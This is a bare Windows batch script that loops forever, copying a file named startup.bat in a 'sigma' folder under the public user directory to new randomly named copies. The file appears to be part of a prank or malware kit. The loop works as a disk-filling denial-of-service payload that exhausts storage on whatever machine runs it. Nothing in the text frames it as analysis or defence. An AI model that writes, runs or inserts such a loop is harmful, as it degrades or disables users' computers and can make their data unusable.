@echo off
:loop
copy %PUBLIC%\sigma\startup.bat %PUBLIC%\sigma\startup-%random%.bat
goto loop
